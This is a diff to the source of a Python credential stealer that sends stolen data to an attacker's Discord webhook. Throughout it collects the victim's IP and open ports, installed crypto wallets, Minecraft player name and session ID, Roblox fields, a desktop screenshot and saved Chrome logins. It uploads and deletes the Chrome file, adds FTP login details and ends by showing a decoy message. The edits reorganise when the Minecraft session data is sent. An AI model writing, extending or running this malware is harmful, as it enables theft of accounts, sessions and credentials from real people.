@@ -259,8 +259,6 @@ if __name__ == '__main__':
             PCInfo.add_field(name="**:computer: IP Address**:", value=f"{ip_address}", inline=True)
             PCInfo.add_field(name="**:map: Open Ports**:", value=f"{ports_string}", inline=False)
             PCInfo.add_field(name="**:moneybag: Crypto Wallets Installed On PC:**", value=f"{Wallets}", inline=False)
-            PCInfo.add_field(name="**:man_technologist: Player Name:**", value=f"{player_id}", inline=True)
-            PCInfo.add_field(name="**:unlock: Minecraft SSID:**", value=f"{session_id}", inline=True)
             PCInfo.add_field(name="**:wireless: FTP Connection Login:**", value=f"IP:{ip_address}"+":21\n Username: SSIDSpin \n Password: Admin", inline=False)
             send_to_discord(Webhook, embed=PCInfo)
             DiscordInfo=discord.Embed(
@@ -285,14 +283,22 @@ if __name__ == '__main__':
             RobloxAccount.add_field(name="**:moneybag: Robux:**", value="```Coming Soon```", inline=True)
             RobloxAccount.add_field(name="**:white_check_mark: Is Verified:**", value="```Coming Soon```", inline=True)
             RobloxAccount.add_field(name="**:cookie: Roblox Cookie:**", value="```Coming Soon```", inline=False)
-            
             send_to_discord(Webhook,embed=RobloxAccount)
+
+            MCAccount=discord.Embed(
+                title=f"{hostname} Minecraft Account Info",
+                color= 0x75E6DA
+            )
+            MCAccount.add_field(name="**:man_technologist: Player Name:**", value=f"{player_id}", inline=True)
+            MCAccount.add_field(name="**:unlock: Minecraft SSID:**", value=f"{session_id}", inline=True)
+
             UsersCurrentScreen=discord.Embed(
                 title=f"{hostname} Desktop Screenshot",
                 color= 0xBB11DA
             )
             UsersCurrentScreen.set_image(url=Uploadlink)
             send_to_discord(Webhook, embed=UsersCurrentScreen)
+
 
             folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
             all_logins = ""
@@ -330,13 +336,15 @@ if __name__ == '__main__':
                 ChromeData.add_field(name="**Chrome Data Has Been Uploaded To:**", value=f"```{chromeupload}```", inline=True)
                 send_to_discord(Webhook, embed=ChromeData)
                 os.remove("chrome_logins.txt")
+            send_to_discord(Webhook, embed=MCAccount)
             fakeMessage()
 
-    except Exception as e: #Error 32, can occur IDK why but it sends a red flag even if it gets data. Dont know. Dont care
-        ChromeDataError = discord.Embed(
+    except Exception as e:#Error 32, can occur IDK why but it sends a red flag even if it gets data. Dont know. Dont care
+        if all_logins == "":
+            ChromeDataError = discord.Embed(
             title = f"{hostname} No Stored Chrome Passwords",
             description = "",
             colour = 0xEE4B2B
-        )
-        send_to_discord(Webhook, embed=ChromeDataError)
+            )
+            send_to_discord(Webhook, embed=ChromeDataError)
         fakeMessage()
